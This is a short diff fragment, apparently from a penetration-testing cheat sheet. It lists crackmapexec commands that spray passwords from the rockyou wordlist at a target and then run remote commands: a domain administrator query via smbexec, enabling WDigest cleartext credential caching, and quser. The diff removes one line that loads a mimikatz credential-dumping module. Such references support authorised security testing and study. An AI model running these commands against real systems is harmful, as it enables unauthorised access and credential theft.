@@ -2334,7 +2334,6 @@ crackmapexec <PROTOCOL> <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wo
 crackmapexec <PROTOCOL> <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
 crackmapexec <PROTOCOL> <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
 crackmapexec <PROTOCOL> <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
-crackmapexec <PROTOCOL> <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -m modules/credentials/mimikatz.py
 ```
 
 #### fcrack
